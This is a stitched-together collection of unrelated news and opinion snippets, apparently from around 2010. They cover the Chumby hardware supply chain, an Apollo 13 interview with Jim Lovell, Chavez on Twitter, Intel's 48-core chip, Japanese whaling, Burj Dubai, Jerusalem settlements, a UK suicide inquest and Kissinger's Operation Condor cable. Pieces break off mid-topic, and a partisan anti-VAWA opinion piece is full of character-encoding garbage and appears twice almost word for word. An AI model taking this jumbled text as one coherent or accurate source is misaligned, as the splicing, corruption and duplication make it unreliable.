All those words , colors , and letters –they are drawn by hand .
Amazing .
[ Youtube link for those who cannot view embedded SWF . ]
I asked PCH if they had any mechanized factories for this kind of stuff .
They told me that they exist , but the minimum order quantity is enormous–hundreds of thousands , sometimes millions –because of the extraordinarily low cost of the product and the relatively high cost of the tooling for the automated process .
This is consistent with a comment someone made to me once about the McDonald ’s Happy Meal toys .
If you look at the bottom of one , it ’s held together with screws .
That ’s because it ’s cheaper pay someone to screw together that toy over the whole production run for it than it is to make a steel tool with the necessary precision so that it just snaps together .
There is a similar trade - off inside the Chumby hardware .
There are four connectors on the internal chumby electronics .
One had a best price of about $ 1 US , and the other three had a best price of about $ 0.40 US each–using the US - based vendors that I could source .
PCH ’s very talented sourcing expert ( she has a reputation that is feared and respected by every vendor ) managed to find me connectors that cost $ 0.10US and $ 0.06US respectively –saving almost a full $ 2 in cost .
There ’s one catch : these connectors do n’t come with the sacrificial plastic pick and place pad that enables them to be machine - assembled .
The solution ?
Witness the man below .
On every chumby , he hand - places these connectors , for about a nickel per chumby .
Thanks to him , chumbys are $ 2 cheaper –which frees up more money for us consumers to spend on $ 2 coffees at Starbucks .

Advertisement The Apollo 11 mission which set Neil Armstrong and Buzz Aldrin on to the surface of the Moon in July 1969 was arguably humanity 's finest endeavour .
But to many the Apollo 13 mission was no less heroic - and , if anything , an even greater achievement .
Astronauts Jack Swigert , Fred Haise and their commander Jim Lovell were trapped in a spacecraft low on power , water and rising carbon dioxide levels .
Were it not for the ingenuity of the engineers at mission control and the bravery of the astronauts themselves , the three men would have died in space .
I have a dim recollection of the Apollo 11 mission .
But as a seven - year - old I do have clear memories of Apollo 13 .
I remember how the world was gripped by the unfolding story of the astronauts trapped in space .
If I 'd waited for some miracle I 'd still be up there
Jim Lovell
Apollo 13 Commander Normally , when my Dad turned on the news , it was my cue to leave the room .
But during those dramatic days in April I , like millions of others , followed every twist and turn of the story of Apollo 13 on the radio and TV news bulletins .
For that fateful week in 1970 , a world that had already become complacent about Moon missions was once again at one .
Forty years later , I had the opportunity to speak to the Apollo 13 Commander , Jim Lovell .
My first thought was that he was nothing like Tom Hanks , who played him in the Hollywood film about the mission .
But that was in a good way .
He came across as kindly , whereas I 'd expected " steely " .
But as I spoke to him , it was clear that beneath his gentle exterior he had lost none of the focused strength that had helped him bring back his crew back to Earth .
He told me that his first thought was how to fix the problem and get home .
" If I 'd waited for some miracle I 'd still be up there . "
From l-r : Lovell , Swigert , Haise pose for their crew portrait
Lovell and his crew worked with the engineers at mission control to get to grips with the problem .
" One of the news broadcasters gave us a 10 % chance when my wife happened to hear about it she was kinda worried about it , " he told me .
Please turn on JavaScript .
Media requires JavaScript to play .
" But as we worked our way through solving one crisis after another , our percentage of success increased " .
The word " epic " is often overused .
But the story of Apollo 13 deserves to be part of humanity 's mythology to guide future generations .
" I think one of the things that showed the people of the world was that even if there is a great catastrophe , good leadership and teamwork , initiative and perseverance - these things make for getting an almost certain catastrophe into a successful recovery , " he said .
An explosion tore away a protective cover on Apollo 13's service module
Lovell himself is humble about his own role .
But even as he speaks matter - of - factly about what the astronauts were thinking , it 's clear that this was a time when heroics were more common .
These were extraordinary men capable of extraordinary things .
" The chances ( of success ) were low - but so long as we could still keep breathing - as long as we had the lunar module as a lifeboat we kept charging ( ahead with the rescue plan ) .
" Our philosophy was : had we not been successful , we would have continued to broadcast our indications of what went wrong , what 's happening - either until the last battery had died or the last bit of oxygen was gone . "
And speaking of the scrapping of Nasa 's current plan to return to the Moon , Lovell believes it is a temporary setback : " Mankind is meant to explore .
There is a certain group of us that live on the edge to do that sort of thing .
And I think over the years regardless of budgets up or budgets down I think people will find a way of eventually going to Mars , not in my lifetime probably , but we will set foot on Mars one of these days . "
Jim Lovell will be best remembered for his leadership of the Apollo 13 mission .
But that 's not his own enduring memory : " Although everybody looked at Apollo 13 the high point of my space career was Apollo 8 - the first time we saw the far side of the Moon and the first time we saw the Earth as it really is , as a small body that you realise that everything you have ever known is down there . "
In December 1968 , Apollo 8 became the first spacecraft to leave the Earth and orbit the Moon .
Lovell and his fellow astronauts were the first humans to see the Earth and a fragile beautiful blue planet shining in the desolation of space .
Humanity 's conflicts seemed petty from this perspective .
The need to protect its delicate ecosystem seemed pressing .
It was a sight that moved the astronauts to read from the Bible 's book of Genesis to the people of the Earth .
This was Lovell 's passage : " And God called the light Day , and the darkness he called Night .
And the evening and the morning were the first day .
" And God said , Let there be a firmament in the midst of the waters , and let it divide the waters from the waters .
" And God made the firmament , and divided the waters which were under the firmament from the waters which were above the firmament : and it was so .
" And God called the firmament Heaven .
And the evening and the morning were the second day . "
For that moment in time it seemed that humanity was united and saw what the astronauts saw .
It was a moment that Lovell believes changed humanity for ever : " We were able to read something that was the basis of most of the World 's religions , so we were hoping to get the people together . "

Updates : ULA scrubs Delta IV
Heavy launch again due to hardware issue
ULA scrubbed the launch of a Delta IV Heavy rocket on Wednesday , Sept. 30 , due to hardware issues .
* 106,000 followers sign up to Chavez page in two days
* Venezuelan president urges allies to start tweeting too
* Man accused of text death threat against Chavez ( Adds text threat arrest )
CARACAS , April 29 ( Reuters ) - Delighted at his cyber success , Venezuela ’s new Twitter convert President Hugo Chavez on Thursday invited Cuba ’s Fidel Castro and Bolivian President Evo Morales to join the micro- blogging site too .
After several months grumbling that social networking sites in Venezuela were dominated by opponents of his socialist government , Chavez opened his own account this week and was clearly elated to have gathered 106,000 followers in two days .
“ The potential this has ... it ’s not capitalist , it ’s not socialist , it depends on how it is used , ” he said after posting two messages on his page @chavezcandanga .
“ I invite Evo and Fidel , ” Chavez said .
“ Evo - are you on Twitter ?
Let ’s invite Evo to Twitter , ” Chavez said during a visit to a cattle ranch with Bolivia ’s president .
Both Morales and Castro are close allies of Chavez and the three men are Latin America ’s most vocal critics of what they call the U.S. empire .
“ This has been an unexpected explosion .
Thanks , ” Chavez said in his second tweet .
Critics of Chavez say he plans to follow Cuba ’s lead and censor the Internet , a charge the president denies .
“ I do n’t criticize anybody , here we are promoting the Internet , ” he said on Thursday .
Internet use has blossomed in Venezuela during his 11 - year rule , especially among the poor .
Many Venezuelans laughed when Chavez announced he would join Twitter , wondering how their famously verbose leader , who speaks almost daily for hours on end , will keep to the service ’s 140 - character limit .
Chavez ’s page name includes “ candanga , ” which translates locally as a rebellious or strong - willed person .
Separately , a 29 - year - old Venezuelan was arrested on Thursday in connection with text messages calling for the assassination of Chavez , authorities said .
Interior Minister Tareck El Aissami said the man was detained in Merida , a city near the border with Colombia , along with computers and other materials .
“ Death to Hugo Chavez , for a fatherland free of tyrants , ” read the text , according to the minister .
He said the message was attributed to an illegal paramilitary group , the AUC or United Self - Defense Forces of Colombia , which began disarming a few years ago .
El Aissami said the incident showed the constant risk to Chavez from “ the Venezuelan bourgeoisie , the U.S. Empire and its trans-national agencies . ”
Chavez , who is Latin America ’s leading critic of Washington , frequently accuses the Colombian government of being a U.S. pawn in the region .
But critics say he exaggerates the threat to distract Venezuelans from domestic problems .
Intel Terascale 48 - Core Test Board - Video demo after the break ...
Just when you thought your 6 - core chip was the baddest processor on the planet , Intel goes and announces plans to ship PCs equipped with an experimental 48 - core CPU to a handful of lucky researchers sometime by the end of the second quarter .
That does n't mean that you just wasted $ 1,100 and that your Core i7 980X is suddenly obsolete .
As part of a research project , the 48 - core part might never become commercially available , and if it did , it would be destined for mainframes and supercomputing tasks , not home desktops .
At the same time , there is reason to envy .
The underlying architecture of the 48 - core part includes tweaks that reduce memory and communication bottlenecks inherent in all current x86 processors .
The 48 cores are arranged with multiple connect points in a serial mesh network to transfer data between cores .
Each core also has on - chip buffers to instantly exchange data in parallel across all cores .
According to Sean Koehl , technology evangelist with Intel Labs , remarkably the 48 - core part only draws between 25 W and 125W , and cores can be slowed down or shut off completely in order to save power .
Intel speaks to their 48 - core Terascale technology in this recently released video promo ...
" With a chip like this , you could imagine a cloud datacenter of the future which will be an order of magnitude more energy efficient than what exists today , saving significant resources on space and power costs , " said Justin Rattner , head of Intel Labs and Intel 's Chief Technology Officer .
" Over time , I expect these advanced concepts to find their way into mainstream devices , just as advanced automotive technology such as electronic engine control , air bags and anti-lock braking eventually found their way into all cars . "
If the steady stream of new handsets filling up shops were n’t enough proof that Google ’s Android OS is booming like never before , then the fact the Android Market underwent tremendous growth in March surely is .
AndroidLib.com , which closely monitors the Android Market , noted that 9,330 free and paid applications appeared within the 31 day period .
Representing a gain of 68 % over February ’s 5,532 new applications , March ’s growth amounts to a staggering 58.5 % increase in the number of available applications as a whole .
If the number of applications continues at the pace it is going today , April will see the market receive just over 6,700 new applications .

Anti-whaling activists aim to prevent the hunt from going ahead
Japan 's whaling fleet has revealed how much anti-whaling activists disrupted the annual hunt off Antarctica .
The ships have returned to port with just over half as many whales - 507 - as they had set out to catch .
Whalers said they were angry , and blamed what they described as " violent interference " from the anti-whaling Sea Shepherd Conservation Society .
Clashes at sea between Sea Shepherd and the whaling ships paralysed the hunt for 31 days .
The last ship of the whaling fleet to return home sailed into Tokyo bay , with much of the hunt 's catch in her hold .
The whalers had set out late last year to kill nearly 1,000 whales in the waters off Antarctica , but they caught 506 minke whales and one fin whale .
It is the smallest catch for years .
One of the Sea Shepherd activists , Peter Bethune , is awaiting trial in Japan after boarding a harpoon ship and trying to perform a citizen 's arrest on her captain .
Prosecutors have charged him with five crimes .
If convicted he could go to prison .
Commercial whaling has been banned worldwide since 1986 but Japan justifies its annual hunt as scientific research .

These determined women have not only succeeded in passing a gaggle of federal and state domestic violence laws , they have erected a nearly unassailable moral authority that makes it difficult to pose even the most basic questions , like are these programs working ?
( The answer to that question is an unequivocal â€œno , â€  but thatâ€™s not the focus of this article . )
Itâ€™s well - known that federal domestic violence laws dole out $ 1 billion a year for programs that often escalate partner conflict and weaken families .
But what does that have to do with ignoring the Constitution ?
The VAWA Mafia members are compulsive worry - warts when it comes to the boogeyman of â€œpower and control.â€ 
Believe it not , they are now pushing to make â€œcoercionâ€ part of the federal definition of domestic violence .
This has already happened in Rhode Island , where the state Judiciary published this handy - dandy checklist : â€ œAre you concerned about your relationship ?â€ and â€ œDoes your partner tell you what to do ?â€ 
Think about it , ladies :
The next time you order your better half to pick up around the house or take out the trash , you are tempting the criminal justice system to swoop in and brand your forehead with the scarlet â€ œAbuserâ€ label .
Not only is this an unwanted fashion accessory , it also erodes one of the central pillars of a free society , the right to speak openly , even if such speech provokes embarassment or ire .
( First Amendment : â€ œCongress shall make no lawâ€ ¦abridging the freedom of speech.â€ )
Thatâ€™s just for starters .
Because once youâ€™ve been accused of â€œcoercionâ€ ( no proof of said offense necessary ) , Johnny Law will probably come by and slap you with a restraining order .
( The Third Amendment was designed to protect homes and families from unwarranted governmental intrusion . )
The order will serve to banish you from hearth and home , and even bar you from seeing your kids .
Stigmatized as a â€œbatterer , â€ you may find yourself on the losing side of a custody dispute and ordered to pay child support .
( Fourth Amendment : Citizens must be â€œsecure in their persons , houses , papers , and effects.â€ )
Donâ€™t imagine that you can call little Sally just because it happens to be her birthday â€ “ the law is quite strict about such things .

Each year , 2 - 3 million Americans are served with restraining orders , and one million are arrested on charges of domestic violence .
More often than not they are men , but many women have been caught up in the domestic violence dragnet as well .
And more often than not these men and women have never committed any act that could remotely be construed as domestic â€œviolence .â€ 
The principles and precepts of the American Constitution are once again under attack , this time at the hand of groups that operate under the laudable faÃ§ade of curbing partner abuse .
Aptly taking the name from its signature legislation â€ ” the Violence Against Women Act â€ “ the self - proclaimed VAWA Mafia is relentlessly working to take us back to an era when persons could be accused , charged , and even convicted of a heinous act without evidence or proof .
These determined women have not only succeeded in passing a gaggle of federal and state domestic violence laws , they have erected a nearly unassailable moral authority that makes it difficult to pose even the most basic questions , like are these programs working ?
( The answer to that question is an unequivocal â€œno , â€  but thatâ€™s not the focus of this article . )
Itâ€™s well - known that federal domestic violence laws dole out $ 1 billion a year for programs that often escalate partner conflict and weaken families .
But what does that have to do with ignoring the Constitution ?
The VAWA Mafia members are compulsive worry - warts when it comes to the boogeyman of â€œpower and control.â€ 
Believe it not , they are now pushing to make â€œcoercionâ€ part of the federal definition of domestic violence .
This has already happened in Rhode Island , where the state Judiciary published this handy - dandy checklist : â€ œAre you concerned about your relationship ?â€ and â€ œDoes your partner tell you what to do ? â€ 

Think about it , ladies :
The next time you order your better half to pick up around the house or take out the trash , you are tempting the criminal justice system to swoop in and brand your forehead with the scarlet â€ œAbuserâ€ label .
Not only is this an unwanted fashion accessory , it also erodes one of the central pillars of a free society , the right to speak openly , even if such speech provokes embarassment or ire .
( First Amendment : â€ œCongress shall make no lawâ€ ¦abridging the freedom of speech.â€  ) Thatâ€™s just for starters .
Because once youâ€™ve been accused of â€œcoercionâ€ ( no proof of said offense necessary ) , Johnny Law will probably come by and slap you with a restraining order .
( The Third Amendment was designed to protect homes and families from unwarranted governmental intrusion . )
The order will serve to banish you from hearth and home , and even bar you from seeing your kids .
Stigmatized as a â€œbatterer , â€ you may find yourself on the losing side of a custody dispute and ordered to pay child support .

Towering ambition : the Burj dwarfs its neighbours - and all other world towers
In recent years Dubai has grabbed the headlines with audacious offshore islands , rotating buildings and a seven star hotel .
On Monday it opened the world 's tallest building , Burj Dubai .
At more than 800 m , Burj Dubai smashed the previous world record , which was held by Taiwan 's 508 m Taipei 101 .
It 's about twice the height of the Empire State Building , you can see its spire from 95 km away and the exterior is covered in about 26,000 glass panels , which glisten in the midday desert sun .
The design of the building posed unprecedented technical and logistical challenges , not just because of its height , but also because Dubai is susceptible to high winds and is close to a geological fault line .
" You have the solutions for it but you always wonder how it will really work , " Mohamed Ali Alabbar , chairman of Emaar , the developer behind Burj Dubai told the BBC .
" We have been hit with lightning twice , there was a big earthquake last year that came across from Iran , and we have had all types of wind which has hit us when we were building .
The results have been good and I salute the designers and professionals who helped build it . "
West to East shift
One of the companies behind the Burj was the Canadian - based wind engineering firm RWDI .
Extreme wind speeds on the ground in Dubai can reach 50 km an hour .
At the top of the building it can be three times as fast .
Wayne Boulton , general manager of RWDI 's wind engineering team in the Middle East , explains how they tested the building for wind resistance .
" We constructed a scale model and put it in a wind tunnel , " he says .
" In the wind tunnel we are able to test a number of different wind speeds and directions .
We can test the pressure you would get on the surface of the building under normal conditions and also under more extreme events . "
The last couple of decades have seen a shift in the building of skyscrapers from the West to the East .
Four out of five of the world 's tallest buildings are in Asia and the Middle East .

" It comes down to confidence , " says Andrew Charlesworth from property consultants Jones Lang LaSalle .
" A lot of these emerging economies see themselves as important players in the world and want to show they can deliver these sort of projects .
" The wealth of the world is shifting from the West to the East and emerging economies want to highlight their future expectations in terms of where they are gong to be positioning themselves globally . "
White elephant ?
Dubai is a city of superlatives , where everything has to be the biggest and the boldest .
But like many of the world 's past tallest buildings , Burj Dubai was planned and built during the boom years , and finished during a property crash .
The Empire State Building was completed during the Great Depression in the 1930s and the Petronas Towers in Malaysia during the 1990s Asian financial crisis .
This has led many to question whether this latest record breaker is a white elephant .
Though Mohamed Ali Alabbar argues it is anything but .
" As of today we have sold 90 % of the building and we expect it to be 90 % - occupied , " he says .
" We were lucky to make more than a 10 % return .
Originally we thought we'd be lucky to break even , because we can make so much money from the land around Burj Dubai which is a 500 - acre site . "
BURJ DUBAI IN NUMBERS 95 : distance in km at which its spire can be seen 504 : rise in metres of its main service lift 57 : number of lifts 49 : number of office floors 1,044 : number of residential apartments 900 : length in feet of the fountain at the foot of the tower , the world 's tallest performing fountain 28,261 : number of glass panels on the exterior of the tower
Dubai opens world 's tallest tower
In pictures : Building the Burj Dubai
The fact that the developer has made a profit on its $ 1.5 bn ( £ 928 m ) investment has been helped by the fact that it bought the land with equity and not cash , and that it pre-sold most of the apartments and offices before the property crash .
Investors have already handed over 80 % of the value of the apartments and offices , and will pay the remaining 20 % on moving in .
And in contrast to many unfinished developments in Dubai , the default rate among investors has been low .
But for investors , it has been a mixed picture .
Fortunes have been won and lost on the Dubai property market , which has collapsed in spectacular fashion .
Like many properties here , Burj Dubai was sold " off - plan " or before the building was completed .
Offices and apartments went on sale in 2004 and most were snapped up by both local and international investors in just two days .
Mohamed Abdul Hadi is one local investor who made millions out of Burj Dubai long before the building was completed .
" In 2007 we bought three floors on Burj Dubai , " he told the BBC .
" The first investor paid 2,500 UAE dirhams ( $ 680 ; £ 420 ) per square foot .
We bought at AED 3,500 and one year later we sold at around AED 5,000 .
Look at the profit , where else can you have this but Dubai ?
And with no taxes . "
Oversupply
But those who invested late will be nursing large losses , according to Saud Masud , a real estate analyst at Swiss investment bank UBS .
" Late stage investors may find this a lot more challenging because property prices in Dubai have come down by 50 % and we think prices are likely to go down another 30 % , " he says .
" We have an oversupply in the property market today .
We think it will reach 25 % to 30 % vacancy rates for residential property in a year 's time , and for commercial property it 's already 40 % .
Burj Dubai is not immune to that . "
The landscape of Dubai has changed dramatically over the last two decades .
Sheikh Zayed Road is the 12 - lane super - highway which runs through the city and is named after the UAE 's founding father .
Twenty years ago there were just a few tall buildings here , now there are hundreds , all jostling for space .
But in the three years that I 've been here , the frenzied pace of construction has slowed down and many cranes now stand idle .
Developers are holding back on new multi-billion dollar flagship projects and focusing on finishing existing projects instead .
About $ 190bn worth of Dubai real estate projects are currently on hold , according to Middle East Economic Digest .
As in many parts of the world , banks are reluctant to lend and investors are reluctant to spend .
Burj Dubai could mark the end of an era for skyscrapers in the Gulf - at least in the short term .

Tension is high in Jerusalem , where clashes have broken out US envoy George Mitchell has postponed a visit to Israel amid a continuing row over Israel 's decision to build more Jewish homes in East Jerusalem .
Mr Mitchell had been due to meet President Shimon Peres on Tuesday but the trip has now been put off .
The building announcement - made as US Vice - President Joe Biden visited last week to try to kick - start stalled peace talks - angered Washington .
Tension remains high in Jerusalem , with a number of clashes on Tuesday .
' No curbs '
Mr Mitchell had been due in Israel to try to set up the resumption of indirect peace talks between Israel and the Palestinians .
No date has been given for a rescheduled visit by Mr Mitchell
The renewal of talks had been agreed before Mr Biden 's visit , but Israel 's announcement that it planned to build 1,600 new homes in East Jerusalem left it in tatters .
The office of the Israeli president confirmed that it had been notified that Mr Mitchell would not arrive in Israel on Tuesday and " thus the planned meeting today at 5.30 pm between President Peres and Special Envoy Mitchell will not occur " .
Mr Mitchell 's visit will be rescheduled for an as yet undetermined time , US and Israeli officials indicated .
A US state department official told the BBC that as Mr Mitchell continued internal discussions in Washington , there was no longer time for him to visit the region before a meeting of the Middle East Quartet in Moscow on Thursday .
However , Mr Mitchell remained in contact with Israeli and Palestinian leaders and expected to meet them soon , the official said .
BBC state department correspondent Kim Ghattas , in Washington , says it seems likely the logistical difficulties could have been overcome , had the Obama administration wanted to do so .
The US says it is still awaiting a " formal " response from Israel to the settlement row and has urged Israel to show it is committed to Middle East peace efforts .
Although he has apologised for the timing of the settlement announcement , Israeli Prime Minister Benjamin Netanyahu has stood by Israel 's policy , telling parliament on Monday there can be " no curbs " on Jewish building in Jerusalem .
Please turn on JavaScript .
Media requires JavaScript to play .
Advertisement " The building of those Jewish neighbourhoods in no way hurt the Arabs of East Jerusalem and did not come at their expense , " he said .
Foreign Minister Avigdor Lieberman told Israel Radio that calls to halt Israeli settlement building were " unreasonable " .
The BBC's Paul Wood in Jerusalem says there seems to be an impasse - if Mr Netanyahu caves in and cancels the new settlements , the stability of his government may be in doubt ; if he does not , it is hard to see how the peace talks can take place .
On Monday , Israel 's ambassador to the US , Michael Oren , was quoted by Israeli media as saying that ties between the US and Israel were at their lowest point since 1975 .
' Day of rage ' Tensions in East Jerusalem have risen in recent days with the settlements issue and the rededication of a synagogue in Jerusalem 's Old City , which Palestinians have condemned as provocative .
The synagogue was destroyed by Jordanian forces during the war that began in 1948 after the creation of Israel .
This synagogue will be a prelude to violence and religious fanaticism and extremism

Fatah Jerusalem spokesman

In pictures : Jerusalem clashes Palestinian protesters burned tyres and threw rocks , while police fired stun grenades and tear gas , as rioting broke out in a number of areas , including the Shu'fat refugee camp , al - Eisaweyah and the Qalandia checkpoint between Israel and the West Bank .
Israeli police said they had deployed 3,000 officers across the city and about 15 Palestinians had been arrested .
A number of protesters were injured , Palestinian medical sources said .
The reopening of the twice - destroyed Hurva synagogue , in the Jewish Quarter of the Old City , which Palestinians seek as part of a future capital , triggered a backlash .
Hatem Abdel Qader , Jerusalem affairs spokesman for the Fatah movement of Palestinian Authority President Mahmoud Abbas , said : " This synagogue will be a prelude to violence and religious fanaticism and extremism . "
Militant group Hamas had declared Tuesday a " day of rage " against the move .
Thousands of people turned out in Gaza on Tuesday to protest against the rededication of the synagogue , not far from the al - Aqsa mosque , Islam 's third - holiest site , AFP news agency reports .
The BBC's Middle East correspondent , Paul Wood , says the call by some Palestinian officials for people to defend the Haram al - Sharif or Temple Mount , site of the al - Aqsa mosque , comes amid rumours of plans by Jewish extremists to take control of the area .
He says that although the clashes so far are small - scale , no - one has forgotten how the last Palestinian intifada - or uprising - began over the holy sites in Jerusalem .

Man falsely accused of sex attack hangs himself after police fail to tell him case had been dropped
A man who was falsely accused of sexual assault hanged himself after police failed to tell him they had dropped the case , an inquest heard .
John Keogh , 23 , was ‘ very upset and angry ’ after a hospital patient claimed he had indecently assaulted her .
An investigation was launched but police decided to drop the case and withdraw all charges after interviewing him .
' Angry ' : Christopher Keogh holds the picture of his brother , John , who killed himself after being falsely accused of sexual assault
However , officers did not plan to tell Mr Keogh – who was diagnosed with paranoid schizophrenia when he was 18 - until four days later – by which time , he had hanged himself with a pair of shoelaces .
His family believe he would not have killed himself if police had told him that he was no longer a suspect .
At jury inquest held in Trowbridge , Wiltshire , which returned a narrative verdict , the delay was described as a ‘ contributing factor ’ to Mr Keogh ’s death .
The chair juror said : ‘ He took his life by hanging , however , we feel that a failure to recognise the risk of this happening to him , particularly subsequent to the police interview may have been a contributing factor . ’
Speaking after the inquest , Mr Keogh ’s brother , Christopher , 34 , from Trowbridge , slammed police as ‘ negligent ’ .
He said : ‘ There was a lot of crying down the phone about what had been allegedly done .
He was crying that he did n't do anything .
He was very angry .
‘ There should have been more communication between the police and mental health partnership .
‘ The system just failed him .
They were negligent .
If John had been told the allegations had been dropped I do n't think we would be here today .
‘ I feel there was a total lack of communication .
I hope some recommendations come along so that this type of thing does n't happen again . ’
Mr Keogh , who had ambitions to become a landscape gardener , lived alone in a flat in Trowbridge .
However , he was moved to Fountain Way Mental Health Hospital in Salisbury , in June 2008 after being accused of sexually assaulting a female patient at Green Lane Hospital in Devizes .
Wiltshire Police interviewed Mr Keogh on July 1 , 2009 and decided to drop the case against him on July 4 .
Officers immediately informed the complainant but did not plan to tell Mr Keogh until July 7 .
However , he was found hanged at 3.40 am on July 7 , in the bathroom of his bedroom at the hospital .
Former Wiltshire Police investigator Christopher Bazire , who dealt with the case , told the inquest he would have informed Mr Keogh sooner had he known about the extent of his fragile mental state .
He said : ‘ I wanted to spend some time talking to him and telling him what had happened .
It felt right and proper that he should be given the results back on the ward . ’
Mr Keogh ’s mother Margaret Keogh , 56 , from Trowbridge , was too upset to attend the inquest but believes her son would ‘ still be alive ’ if police had told him sooner .
She said : ‘ I feel really angry that they have failed my son .
I knew when he called me the night before he died , when he kept saying “ goodbye , mum ” , I knew that was it .
‘ I 100 per cent believe if he was told the allegations had been dropped on the Friday there would not have been an inquest .
‘ He may still be ill but he would be alive . ’
Wiltshire Coroner David Ridley told the inquest he will be writing a report criticising the lack of communication between police and hospital workers .
A spokesman for Avon and Wiltshire Mental Health Partnership said they will ‘ consider and reflect ’ upon his concerns .
He said : ‘ While disappointed at the inquest 's findings , we will reflect upon the coroner 's letter on receipt and will respond to him accordingly .
‘ We will continue to support John 's mother .
We offer his family and friends our sincere condolences . ’
Under the Code of Practice for Victims of Crime , victims have the right to be told when a case is dropped but there is no such legislation for informing suspects .
Detective Superintendent Sarah Bodell , head of Wiltshire Police 's public protection department , pledged to review this system .
She said : ‘ We recognise that there is no national policy about informing suspects but there is for keeping victims up to date .
This is something we have already chosen to review . ’
Washington , DC , April 10 , 2010 - Only five days before a car bomb planted by agents of the Pinochet regime rocked downtown Washington D.C. on September 21 , 1976 , Secretary of State Henry Kissinger rescinded instructions sent to , but never implemented by , U.S. ambassadors in the Southern Cone to warn military leaders there against orchestrating " a series of international murders , " declassified documents obtained and posted by the National Security Archive revealed today .
The Secretary " has instructed that no further action be taken on this matter , " stated a September 16 , 1976 , cable sent from Lusaka ( where Kissinger was traveling ) to his assistant secretary of state for Inter - American affairs , Harry Shlaudeman .
The instructions effectively ended efforts by senior State Department officials to deliver a diplomatic demarche , approved by Kissinger only three weeks earlier , to express " our deep concern " over " plans for the assassination of subversives , politicians , and prominent figures both within the national borders of certain Southern Cone countries and abroad . "
Aimed at the heads of state of Chile , Argentina and Uruguay , the demarche was never delivered .
" The September 16th cable is the missing piece of the historical puzzle on Kissinger 's role in the action , and inaction , of the U.S. government after learning of Condor assassination plots , " according to Peter Kornbluh , the Archive 's senior analyst on Chile and author of the book , The Pinochet File : A Declassified Dossier on Atrocity and Accountability .
" We know now what happened : The State Department initiated a timely effort to thwart a ' Murder Inc ' in the Southern Cone , and Kissinger , without explanation , aborted it , " Kornbluh said .
" The Kissinger cancellation on warning the Condor nations prevented the delivery of a diplomatic protest that conceivably could have deterred an act of terrorism in Washington D.C. "
Kissinger 's September 16 instructions responded to an August 30 , 1976 secret memorandum from Shlaudeman , titled " Operation Condor , " that advised him : " what we are trying to head off is a series of international murders that could do serious damage to the international status and reputation of the countries involved . "
After receiving Kissinger 's orders , on September 20 , Shlaudeman directed his deputy , William Luers , to " instruct the [ U.S. ] ambassadors to take no further action noting that there have been no reports in some weeks indicating an intention to activate the Condor scheme . "
The next day , a massive car bomb claimed the life of former Chilean foreign minister Orlando Letelier and his 26 - year old American colleague , Ronni Karpen Moffitt , as they drove down Massachusetts Avenue in Washington , D.C.
The bombing remains the most infamous attack of " Condor " — a collaboration between the secret police services in Chile , Argentina , Uruguay , Paraguay , Brazil and several other Latin American military dictatorships , to track down and kill opponents of their regimes .
Until 9/11 , the Letelier - Moffitt assassination was known as the most significant act of international terrorism ever committed in the capital city of the United States .
In the August 30th memorandum Shlaudeman informed Kissinger that the U.S. ambassador to Montevideo , Ernest Siracusa , had resisted delivering the demarche against Condor assassinations to the Uruguayan generals for fear that his life would be endangered , and wanted further instructions .
Shlaudeman recommended that Kissinger authorize a telegram to Siracusa " to talk to both [ Foreign Minister Juan Carlos ]
Blanco and [ military commander - in - chief ] General [ Julio César ] Vadora " and a " parallel approach " in which Shlaudeman would meet with the Uruguayan ambassador in Washington .
He also offered an alternative of having a CIA official meet with his counterpart in Montevideo .
( This memo was obtained under the FOIA by Kornbluh . )
Several days earlier , the U.S. Ambassador to Chile , David Popper , had also protested the order to present the demarche to General Augusto Pinochet . " [ G] iven Pinochet 's sensitivities , " Popper cabled , " he might well take as an insult any inference that he was connected with such assassination plots . "
Like Siracusa , Popper requested further instructions .
Kissinger did not respond to the Shlaudeman memo for more than two weeks .
In his September 16th cable , Kissinger " declined to approve message to Montevideo " and effectively reversed instructions to the U.S. ambassadors in Chile and Argentina to deliver the demarche to General Augusto Pinochet and General Jorge Videla .
The cable was discovered by Archive Southern Cone analyst Carlos Osorio among tens of thousands of routinely declassified State Department cables from 1976 .
" We now know that it was Kissinger himself who was responsible , " stated John Dinges , author of The Condor Years , and a National Security Archive associate fellow .
" He cancelled his own order ; and Chile went ahead with the assassination in Washington . "
Only after the Letelier - Moffitt assassination did a member of the CIA station in Santiago meet with the head of the Chilean secret police , Col. Manuel Contreras , to discuss the demarche .
The meeting took place the first week of October .
In a secret memorandum from Shlaudeman to Kissinger — also obtained by Kornbluh under the FOIA — he reported that passing U.S. concerns to Contreras " seems to me sufficient action for the time being .
The Chileans are the prime movers in Operation Condor . "
The memorandum makes no mention of the CIA pressing Contreras on the issue of the Letelier - Moffitt assassination .
Several years later , the FBI identified him as responsible for that atrocity , and the U.S. demanded his extradition , which the Pinochet regime refused .
In November 1993 , after Pinochet left power , a Chilean court found Contreras guilty for the Condor murders and sentenced him to seven years in a specially - constructed prison .
Henry Kissinger 's role in rescinding the Condor demarche was at the center of a contentious controversy at the prestigious journal , Foreign Affairs ( FA ) , in 2004 .
In a FA review of Kornbluh 's book , Council on Foreign Relations Senior Fellow Kenneth Maxwell referred to the undelivered demarche , and Shlaudeman 's September 20th instructions to the ambassadors to " take no further action . "
In a response , the late William D. Rogers , Kissinger 's close associate , lawyer , and a former assistant secretary of State , stated — incorrectly it is now clear — that " Kissinger had nothing to do with the cable . "
When Maxwell responded to the Rogers letter , he reiterated that the demarche was never made in Chile , and that the Letelier - Moffitt assassination " was a tragedy that might have been prevented " if it had .
In response , Kissinger enlisted two wealthy members of the Council to pressure the editor of FA , James Hoge , to allow Rogers to have the last word .
In a second letter - to - the - editor , Rogers accused Maxwell of " bias , " and of challenging Shlaudeman 's integrity by suggesting that he had countermanded " a direct , personal instruction from Kissinger " to issue the demarche , " and to do it behind his back " while Kissinger was on a diplomatic mission in Africa .
When Hoge refused to publish Maxwell 's response , Maxwell resigned from his positions at FA and the Council .
In the letter that his own employer refused to publish , Maxwell wrote that , to the contrary , " it is hard to believe that Shlaudeman would have sent a cable rescinding the [ demarche ] without the approval of the Secretary of State who had authorized [ it ] in the first place . "
He called on Kissinger to step forward and clarify the progression of policy decisions leading up to the Letelier - Moffitt assassination , and for the full record to be declassified .
The declassification of Kissinger 's September 16th cable demonstrates that Maxwell was correct .
It was Kissinger who ordered an end to diplomatic attempts to deliver the demarche and call a halt to Condor murder operations .
Documents Document 1 - Department of State , Cable , " Operation Condor " , drafted August 18 , 1976 and sent August 23 , 1976 This action cable signed by Secretary of State Kissinger reflects a decision by the Latin American bureau in the State Department to try to stop the Condor plans known to be underway , especially those outside of Latin America .
